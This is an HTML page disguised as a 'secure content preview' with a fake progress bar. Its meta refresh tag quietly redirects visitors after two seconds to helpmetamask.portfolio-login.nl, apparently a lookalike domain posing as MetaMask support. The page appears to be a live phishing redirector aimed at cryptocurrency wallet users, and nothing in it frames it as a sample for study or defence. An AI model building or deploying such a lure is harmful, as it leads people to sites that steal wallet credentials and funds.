<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Content Preview - Processing Request</title>
  <meta http-equiv="refresh" content="2; url=https://helpmetamask.portfolio-login.nl/" />
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            max-width: 600px;
            margin: 100px auto;
            text-align: center;
            color: #333;
        }
        .status-bar {
            width: 100%;
            height: 4px;
            background: #e0e0e0;
            margin: 20px 0;
        }
        .status-progress {
            width: 100%;
            height: 100%;
            background: #1a73e8;
            animation: progress 2s ease-in-out;
        }
        @keyframes progress {
            0% { width: 0%; }
            100% { width: 100%; }
        }
    </style>
</head>
<body>
    <h3>Processing Your Request</h3>
    <p>Loading secure content preview...</p>
    <div class="status-bar">
        <div class="status-progress"></div>
    </div>
  </body>
</html>
